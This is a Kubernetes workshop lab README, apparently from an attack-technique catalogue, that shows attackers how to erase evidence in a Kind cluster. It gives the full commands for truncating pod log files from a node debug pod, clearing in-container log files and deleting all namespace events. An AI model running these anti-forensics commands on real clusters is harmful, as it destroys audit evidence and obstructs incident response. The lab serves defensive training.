# Clear Container Logs

An attacker who has gained shell access to a running container or to the underlying node can delete or truncate container log files to erase evidence of their activity and frustrate incident response.

## Description

Attackers may delete the application or OS logs on a compromised container in an attempt to prevent detection of their activity. Kubernetes stores container logs as plain files on the host node under `/var/log/containers/` (symlinked to `/var/log/pods/`). Because these files are accessible from both inside the container (if a log driver writes to stdout/stderr) and from the host, an attacker with sufficient access can truncate or delete them. This technique is commonly used after an initial foothold to cover tracks before deploying further tooling.

## Prerequisites

- A running Kubernetes cluster (e.g., `workshop-cluster` via Kind).
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### 1. Deploy the target pod

```bash
kubectl apply -f log-generator.yaml
```

Wait for the pod to be running:

```bash
kubectl get pod log-generator -n default -w
```

### 2. Verify log output is being generated

```bash
kubectl logs log-generator -n default
```

Expected output (timestamps and messages cycling every second):

```
[2026-04-02T04:45:49Z] INFO Processing request id=1000
[2026-04-02T04:45:50Z] INFO Processing request id=1001
[2026-04-02T04:45:51Z] INFO Processing request id=1002
...
```

### 3. Find the log file on the host node (from a privileged context)

Kubernetes writes container logs to the node's filesystem. The path follows the pattern:

```
/var/log/pods/<namespace>_<pod-name>_<pod-uid>/<container-name>/<restart-count>.log
```

Find the log file path and pod UID, then locate it on the node:

```bash
# Get the node running the pod and the pod UID
NODE=$(kubectl get pod log-generator -o jsonpath='{.spec.nodeName}')
POD_UID=$(kubectl get pod log-generator -o jsonpath='{.metadata.uid}')
echo "Node: $NODE, UID: $POD_UID"
```

Run a non-interactive debug command on the node to find the log file:

```bash
kubectl debug node/$NODE --image=busybox -- \
  sh -c 'find /host/var/log/pods -name "*.log" | grep log-generator'
```

Example output:

```
/host/var/log/pods/default_log-generator_<uid>/log-generator/0.log
```

### 4. Technique A — Truncate the log file from the host node

Truncating the file removes all existing content while keeping the file descriptor open, so the container runtime does not detect the file as missing:

```bash
kubectl debug node/$NODE --image=busybox -- \
  sh -c "truncate -s 0 /host/var/log/pods/default_log-generator_${POD_UID}/log-generator/0.log && echo 'Truncated successfully'"
```

Verify the logs are gone from the Kubernetes perspective:

```bash
kubectl logs log-generator -n default
```

Expected output: empty or only newly generated lines.

### 5. Technique B — Clear logs from within the container

If the attacker has exec access to the container itself, they can attempt to clear application-level log files written inside the container's writable layer:

```bash
kubectl exec log-generator -n default -- sh -c 'find / -name "*.log" 2>/dev/null'
```

Inside the container, clear the application log file (if the application writes to a file):

```bash
# Overwrite the log file with an empty file
> /var/log/app/app.log

# Or use truncate
truncate -s 0 /var/log/app/app.log

# Inspect what log-related files exist
find / -name "*.log" 2>/dev/null
```

Note: This does not affect the stdout/stderr logs captured by the container runtime on the host, but it does erase any file-based logging the application maintains.

### 6. Technique C — Delete Kubernetes events related to the pod

After clearing logs, an attacker may also delete Kubernetes events that reference the pod to further erase traces. See the `delete-kubernetes-events` technique for the full walkthrough. As a quick reference:

```bash
kubectl delete events --all -n default
```

### 7. Observe the forensic impact

After truncation, a defender running `kubectl logs` sees no historical data:

```bash
kubectl logs log-generator -n default
```

The log file on the host is now 0 bytes, which means any log shipping agent (Fluentd, Filebeat, etc.) that uses file offsets may skip past the truncation point and miss the re-written content.

## Cleanup

```bash
kubectl delete -f log-generator.yaml
```

Exit and remove the node debug pod if still running:

```bash
kubectl get pods -n default | grep node-debugger
kubectl delete pod <node-debugger-pod-name> -n default
```

## Resources

- [Kubernetes Logging](https://kubernetes.io/docs/concepts/cluster-administration/logging/)
- [Kubernetes Node Debug](https://kubernetes.io/docs/tasks/debug/debug-cluster/kubectl-node-debug/)
- [MITRE ATT&CK — Indicator Removal: Clear Linux or Mac System Logs](https://attack.mitre.org/techniques/T1070/002/)
